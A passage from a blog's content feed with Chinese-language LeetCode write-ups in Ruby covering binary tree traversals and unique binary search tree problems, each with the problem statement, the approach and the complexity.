class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul><h2 id="107-Binary-Tree-Level-Order-Traversal-II"><a href="#107-Binary-Tree-Level-Order-Traversal-II" class="headerlink" title="107. Binary Tree Level Order Traversal II"></a>107. Binary Tree Level Order Traversal II</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given a binary tree, return the bottom-up level order traversal of its nodes’ values. (ie, from left to right, level by level from leaf to root).</p><p>For example:<br>Given binary tree [3,9,20,null,null,15,7],<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure></p><p>return its bottom-up level order traversal as:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [15,7],</span><br><span class="line">  [9,20],</span><br><span class="line">  [3]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>这题和<a href="https://leetcode.com/problems/binary-tree-level-order-traversal/description/" target="_blank" rel="noopener">前面题</a>一样，只需把最后结构逆序即可。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level_order_bottom</span><span class="params">(root)</span></span></span><br><span class="line">  result, queue = [], []</span><br><span class="line">  <span class="keyword">return</span> result <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line">  queue &lt;&lt; root</span><br><span class="line">  <span class="keyword">while</span> <span class="keyword">not</span> queue.empty?</span><br><span class="line">    level = []</span><br><span class="line">    next_level = []</span><br><span class="line">    queue.each <span class="keyword">do</span> <span class="params">|node|</span></span><br><span class="line">      level &lt;&lt; node.val</span><br><span class="line">      next_level &lt;&lt; node.left <span class="keyword">if</span> node.left</span><br><span class="line">      next_level &lt;&lt; node.right <span class="keyword">if</span> node.right</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    result &lt;&lt; level</span><br><span class="line">    queue = next_level</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> result.reverse</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul><h2 id="103-Binary-Tree-Zigzag-Level-Order-Traversal"><a href="#103-Binary-Tree-Zigzag-Level-Order-Traversal" class="headerlink" title="103. Binary Tree Zigzag Level Order Traversal"></a>103. Binary Tree Zigzag Level Order Traversal</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>Given a binary tree, return the zigzag level order traversal of its nodes’ values. (ie, from left to right, then right to left for the next level and alternate between).</p><p>For example:<br>Given binary tree [3,9,20,null,null,15,7],<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure></p><p>return its zigzag level order traversal as:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [20,9],</span><br><span class="line">  [15,7]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h3><p>这题在<a href="https://leetcode.com/problems/binary-tree-level-order-traversal/" target="_blank" rel="noopener">Binary Tree Level Order Traversal</a>基础上，加个标记，偶数行做一下反转即可。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zigzag_level_order</span><span class="params">(root)</span></span></span><br><span class="line">  result, queue = [], []</span><br><span class="line">  <span class="keyword">return</span> result <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line">  queue &lt;&lt; root</span><br><span class="line">  reverse = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">while</span> <span class="keyword">not</span> queue.empty?</span><br><span class="line">    level = []</span><br><span class="line">    next_level = []</span><br><span class="line">    queue.each <span class="keyword">do</span> <span class="params">|node|</span></span><br><span class="line">      level &lt;&lt; node.val</span><br><span class="line">      next_level &lt;&lt; node.left <span class="keyword">if</span> node.left</span><br><span class="line">      next_level &lt;&lt; node.right <span class="keyword">if</span> node.right</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> reverse</span><br><span class="line">      result &lt;&lt; level.reverse</span><br><span class="line">      reverse = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result &lt;&lt; level</span><br><span class="line">      reverse = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    queue = next_level</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="复杂度-2"><a href="#复杂度-2" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Unique Binary Search Trees</title>
      <link href="/2018/05/03/Unique-Binary-Search-Trees/"/>
      <url>/2018/05/03/Unique-Binary-Search-Trees/</url>
      <content type="html"><![CDATA[<h1 id="Unique-Binary-Search-Trees"><a href="#Unique-Binary-Search-Trees" class="headerlink" title="Unique Binary Search Trees"></a>Unique Binary Search Trees</h1><h2 id="96-Unique-Binary-Search-Trees"><a href="#96-Unique-Binary-Search-Trees" class="headerlink" title="96. Unique Binary Search Trees"></a>96. Unique Binary Search Trees</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given n, how many structurally unique BST’s (binary search trees) that store values 1 … n?</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: 5</span><br><span class="line">Explanation:</span><br><span class="line">Given n = 3, there are a total of 5 unique BST&apos;s:</span><br><span class="line"></span><br><span class="line">   1         3     3      2      1</span><br><span class="line">    \       /     /      / \      \</span><br><span class="line">     3     2     1      1   3      2</span><br><span class="line">    /     /       \                 \</span><br><span class="line">   2     1         2                 3</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>解决思路就是以任意一个数为根，比它小的数为左子树，大的为右子树，二叉搜索树的数量就是左子树数量乘以右子树的数量，总数就是以每个数为根节点的二叉搜索树的总和。</p><p>总结成公式为：<br><img src="http://junzhepanblog.qiniudn.com/unique-binary-search-trees/catalan.png" alt="卡特兰数"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_trees</span><span class="params">(n)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> n == <span class="number">0</span></span><br><span class="line">  result = Array.new(n + <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">  result[<span class="number">0</span>], result[<span class="number">1</span>] = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">  (<span class="number">2</span>..n).each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">    i.times.each <span class="keyword">do</span> <span class="params">|j|</span></span><br><span class="line">      result[i] += result[j] * result[i - j - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> result[n]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n^2)</code></li><li>空间复杂度：<code>O(n)</code></li></ul><h2 id="95-Unique-Binary-Search-Trees"><a href="#95-Unique-Binary-Search-Trees" class="headerlink" title="95. Unique Binary Search Trees"></a>95. Unique Binary Search Trees</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given an integer n, generate all structurally unique BST’s (binary search trees) that store values 1 … n.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [1,null,3,2],</span><br><span class="line">  [3,2,null,1],</span><br><span class="line">  [3,1,null,null,2],</span><br><span class="line">  [2,1,3],</span><br><span class="line">  [1,null,2,null,3]</span><br><span class="line">]</span><br><span class="line">Explanation:</span><br><span class="line">The above output corresponds to the 5 unique BST&apos;s shown below:</span><br><span class="line"></span><br><span class="line">   1         3     3      2      1</span><br><span class="line">    \       /     /      / \      \</span><br><span class="line">     3     2     1      1   3      2</span><br><span class="line">    /     /       \                 \</span><br><span class="line">   2     1         2                 3</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>思路跟<a href="https://leetcode.com/problems/unique-binary-search-trees/description/" target="_blank" rel="noopener">Unique Binary Search Trees</a>的类似。</p><ul><li>每选一个节点为根，就要递归求解左右子树的所有情况。</li><li>遍历左右子树的所有情况，把当前节点和左右子树拼接起来。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;TreeNode[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_trees</span><span class="params">(n)</span></span></span><br><span class="line">  <span class="keyword">return</span> [] <span class="keyword">if</span> n == <span class="number">0</span></span><br><span class="line">  _generate_trees(<span class="number">1</span>, n)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _generate_trees<span class="params">(left, right)</span></span></span><br><span class="line">  result = []</span><br><span class="line">  <span class="keyword">if</span> left &gt; right</span><br><span class="line">    result &lt;&lt; <span class="literal">nil</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    (left..right).each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">      lefts = _generate_trees(left, i - <span class="number">1</span>)</span><br><span class="line">      rights = _generate_trees(i + <span class="number">1</span>, right)</span><br><span class="line">      lefts.length.times.each <span class="keyword">do</span> <span class="params">|j|</span></span><br><span class="line">        rights.length.times.each <span class="keyword">do</span> <span class="params">|k|</span></span><br><span class="line">          root = TreeNode.new(i)</span><br><span class="line">          root.left = lefts[j]</span><br><span class="line">          root.right = rights[k]</span><br><span class="line">          result &lt;&lt; root</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n!)</code></li><li>空间复杂度：<code>O(n!)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Binary Tree Deep Traversal</title>
      <link href="/2018/04/28/Binary-Tree-Deep-Traversal/"/>
      <url>/2018/04/28/Binary-Tree-Deep-Traversal/</url>
      <content type="html"><![CDATA[<h1 id="Binary-Tree-Deep-Traversal"><a href="#Binary-Tree-Deep-Traversal" class="headerlink" title="Binary Tree Deep Traversal"></a>Binary Tree Deep Traversal</h1><h2 id="94-Binary-Tree-Inorder-Traversal"><a href="#94-Binary-Tree-Inorder-Traversal" class="headerlink" title="94. Binary Tree Inorder Traversal"></a>94. Binary Tree Inorder Traversal</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given a binary tree, return the inorder traversal of its nodes’ values.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [1,3,2]</span><br></pre></td></tr></table></figure></p><p>Follow up: Recursive solution is trivial, could you do it iteratively?</p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>二叉树中序遍历，题目要求迭代方式实现。</p><p>先来看递归方式：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inorder_traversal</span><span class="params">(root)</span></span></span><br><span class="line">  path = []</span><br><span class="line">  traverse = lambda &#123; <span class="params">|node|</span></span><br><span class="line">    <span class="keyword">if</span> node</span><br><span class="line">      traverse.call(node.left)</span><br><span class="line">      path &lt;&lt; node.val</span><br><span class="line">      traverse.call(node.right)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  &#125;</span><br><span class="line">  traverse.call(root)</span><br><span class="line">  <span class="keyword">return</span> path</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>再看迭代方式：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inorder_traversal</span><span class="params">(root)</span></span></span><br><span class="line">  <span class="keyword">return</span> [] <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line">  node, stack, path = root, [], []</span><br><span class="line">  <span class="keyword">while</span> node <span class="keyword">or</span> <span class="keyword">not</span> stack.empty?</span><br><span class="line">    <span class="keyword">while</span> node</span><br><span class="line">      stack.push node</span><br><span class="line">      node = node.left</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    node = stack.pop</span><br><span class="line">    path &lt;&lt; node.val</span><br><span class="line">    node = node.right</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  path</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="144-Binary-Tree-Preorder-Traversal"><a href="#144-Binary-Tree-Preorder-Traversal" class="headerlink" title="144. Binary Tree Preorder Traversal"></a>144. Binary Tree Preorder Traversal</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given a binary tree, return the preorder traversal of its nodes’ values.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [1,2,3]</span><br></pre></td></tr></table></figure></p><p>Follow up: Recursive solution is trivial, could you do it iteratively?</p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>二叉树前序遍历</p><p>递归方式：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preorder_traversal</span><span class="params">(root)</span></span></span><br><span class="line">  path = []</span><br><span class="line">  traverse = lambda &#123; <span class="params">|node|</span></span><br><span class="line">    <span class="keyword">if</span> node</span><br><span class="line">      path &lt;&lt; node.val</span><br><span class="line">      traverse.call(node.left)</span><br><span class="line">      traverse.call(node.right)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  &#125;</span><br><span class="line">  traverse.call(root)</span><br><span class="line">  <span class="keyword">return</span> path</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>迭代方式：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preorder_traversal</span><span class="params">(root)</span></span></span><br><span class="line">  <span class="keyword">return</span> [] <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line">  node, stack, path = root, [], []</span><br><span class="line">  <span class="keyword">while</span> node <span class="keyword">or</span> <span class="keyword">not</span> stack.empty?</span><br><span class="line">    <span class="keyword">while</span> node</span><br><span class="line">      path &lt;&lt; node.val</span><br><span class="line">      stack.push node</span><br><span class="line">      node = node.left</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    node = stack.pop</span><br><span class="line">    node = node.right</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  path</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="145-Binary-Tree-Postorder-Traversal"><a href="#145-Binary-Tree-Postorder-Traversal" class="headerlink" title="145. Binary Tree Postorder Traversal"></a>145. Binary Tree Postorder Traversal</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>Given a binary tree, return the postorder traversal of its nodes’ values.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [3,2,1]</span><br></pre></td></tr></table></figure></p><p>Follow up: Recursive solution is trivial, could you do it iteratively?</p><h3 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h3><p>二叉树后序遍历</p><p>递归方式：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 